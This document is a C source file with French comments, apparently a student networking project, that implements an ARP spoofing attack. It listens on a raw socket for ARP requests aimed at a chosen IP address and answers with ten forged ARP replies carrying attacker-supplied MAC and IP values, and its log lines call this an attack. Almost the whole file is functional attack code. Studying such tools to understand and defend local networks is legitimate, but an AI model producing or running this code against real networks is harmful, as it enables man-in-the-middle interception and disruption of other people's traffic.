#include "arp_spoofing.h"
#include <sys/ioctl.h>
#include <net/if.h>
#include <linux/if_packet.h>
#include <ifaddrs.h>
#include <signal.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <arpa/inet.h>
#include <string.h>

static int g_sock_raw = -1;

void sigint_handler(int signum)
{
    (void)signum;
    if (g_sock_raw != -1)
        close(g_sock_raw);
    printf("\n[INFO] Exiting program due to Ctrl+C\n");
    exit(EXIT_SUCCESS);
}

char *get_active_interface(void)
{
    struct ifaddrs *ifaddr, *ifa;
    static char interface_name[IFNAMSIZ];

    if (getifaddrs(&ifaddr) == -1) {
        perror("getifaddrs");
        strncpy(interface_name, "eth0", IFNAMSIZ - 1);
        interface_name[IFNAMSIZ - 1] = '\0';
        return interface_name;
    }

    interface_name[0] = '\0';
    for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr && ifa->ifa_addr->sa_family == AF_PACKET) {
            if ((ifa->ifa_flags & IFF_UP) && !(ifa->ifa_flags & IFF_LOOPBACK)) {
                strncpy(interface_name, ifa->ifa_name, IFNAMSIZ - 1);
                interface_name[IFNAMSIZ - 1] = '\0';
                break;
            }
        }
    }
    freeifaddrs(ifaddr);

    if (interface_name[0] == '\0')
        strncpy(interface_name, "eth0", IFNAMSIZ);
    return interface_name;
}

void print_arp_packet(const t_arp_packet *arp_pkt) 
{
    char sender_ip[INET_ADDRSTRLEN], target_ip[INET_ADDRSTRLEN];

    inet_ntop(AF_INET, arp_pkt->sender_ip, sender_ip, INET_ADDRSTRLEN);
    inet_ntop(AF_INET, arp_pkt->target_ip, target_ip, INET_ADDRSTRLEN);

    printf("\n===== Paquet ARP =====\n");
    printf("Type matériel      : %hu\n", ntohs(arp_pkt->htype));
    printf("Type protocole     : 0x%04x\n", ntohs(arp_pkt->ptype));
    printf("Longueur MAC       : %u\n", arp_pkt->hlen);
    printf("Longueur IP        : %u\n", arp_pkt->plen);
    printf("Opcode             : %s (%hu)\n", 
           (ntohs(arp_pkt->opcode) == ARPOP_REQUEST) ? "Requête" : "Réponse", 
           ntohs(arp_pkt->opcode));
    printf("Expéditeur MAC     : %02x:%02x:%02x:%02x:%02x:%02x\n",
           arp_pkt->sender_mac[0], arp_pkt->sender_mac[1], arp_pkt->sender_mac[2], 
           arp_pkt->sender_mac[3], arp_pkt->sender_mac[4], arp_pkt->sender_mac[5]);
    printf("Expéditeur IP      : %s\n", sender_ip);
    printf("Cible MAC          : %02x:%02x:%02x:%02x:%02x:%02x\n",
           arp_pkt->target_mac[0], arp_pkt->target_mac[1], arp_pkt->target_mac[2], 
           arp_pkt->target_mac[3], arp_pkt->target_mac[4], arp_pkt->target_mac[5]);
    printf("Cible IP           : %s\n", target_ip);
    printf("===========================\n\n");
}

void print_ethernet_frame(const t_ethernet_frame *frame)
{
    printf("\n===== Trame Ethernet =====\n");
    printf("Destination MAC : %02x:%02x:%02x:%02x:%02x:%02x\n",
           frame->dest_mac[0], frame->dest_mac[1], frame->dest_mac[2],
           frame->dest_mac[3], frame->dest_mac[4], frame->dest_mac[5]);
    printf("Source MAC      : %02x:%02x:%02x:%02x:%02x:%02x\n",
           frame->src_mac[0], frame->src_mac[1], frame->src_mac[2],
           frame->src_mac[3], frame->src_mac[4], frame->src_mac[5]);
    printf("Ethertype       : 0x%04x\n", ntohs(frame->ethertype));
    /* Affiche le paquet ARP contenu dans la trame */
    print_arp_packet(&frame->arp);
    printf("==========================\n\n");
}

ssize_t send_arp_frame(int sock_raw, const t_ethernet_frame *frame, const char *iface)
{
    struct sockaddr_ll addr = {0};
    struct ifreq ifr = {0};

    ft_strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
    if (ioctl(sock_raw, SIOCGIFINDEX, &ifr) == -1) {
        perror("ioctl SIOCGIFINDEX");
        return -1;
    }
    addr.sll_ifindex = ifr.ifr_ifindex;
    addr.sll_halen = ETH_ALEN;
    ft_memcpy(addr.sll_addr, frame->dest_mac, ETH_ALEN);

    /* Affichage de la trame qui va être envoyée */
    print_ethernet_frame(frame);

    ssize_t sent_bytes = sendto(sock_raw, frame, sizeof(t_ethernet_frame), 0,
                                (struct sockaddr *)&addr, sizeof(addr));
    return sent_bytes;
}





int main(int argc, char *argv[])
{
    char buffer[BUF_REQUEST];
    ssize_t recv_len;
    t_arp_packet reponse;

    signal(SIGINT, sigint_handler);

    if (!parsing_arg(argc, argv, &reponse))
        return EXIT_FAILURE;

    int sock_raw = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (sock_raw < 0) {
        perror("Erreur lors de la création de la socket");
        return EXIT_FAILURE;
    }
    g_sock_raw = sock_raw;

    char *iface = get_active_interface();
    printf("[INFO] Active interface: %s\n", iface);

    printf("[INFO] En attente d'une requête ARP...\n");
    while (1)
    {
        recv_len = recvfrom(sock_raw, buffer, sizeof(buffer), 0, NULL, NULL);
        if (recv_len < 0) {
            perror("Erreur lors de la réception du paquet ARP");
            continue;
        }
        if (recv_len < (ssize_t)(ETH_HLEN + sizeof(t_arp_packet))) {
            fprintf(stderr, "Paquet reçu trop court (%ld octets)\n", recv_len);
            continue;
        }

        t_arp_packet *arp_pkt = (t_arp_packet *)(buffer + ETH_HLEN);
        print_arp_packet(arp_pkt);

        if (get_arp_request(arp_pkt, argv[1])) {
            printf("[INFO] Requête ARP détectée ciblant %s\n", argv[1]);

            t_ethernet_frame frame;
            memset(&frame, 0, sizeof(frame));
            ft_memcpy(frame.dest_mac, reponse.target_mac, ETH_ALEN);
            ft_memcpy(frame.src_mac, reponse.sender_mac, ETH_ALEN);
            frame.ethertype = htons(ETH_P_ARP);
            ft_memcpy(&frame.arp, &reponse, sizeof(t_arp_packet));
            for (int i = 0; i < 10; i++) {
                ssize_t sent = send_arp_frame(sock_raw, &frame, iface);
                if (sent < 0) {
                    perror("Erreur envoi de la trame ARP");
                } else {
                    printf("[INFO] Paquet ARP spoofé envoyé (%ld octets)\n", sent);
                }
                sleep(2);
            }
            printf("[INFO] Fin de l'attaque ARP spoofing. Exiting...\n");
        }
    }
    close(sock_raw);
    return EXIT_SUCCESS;
}
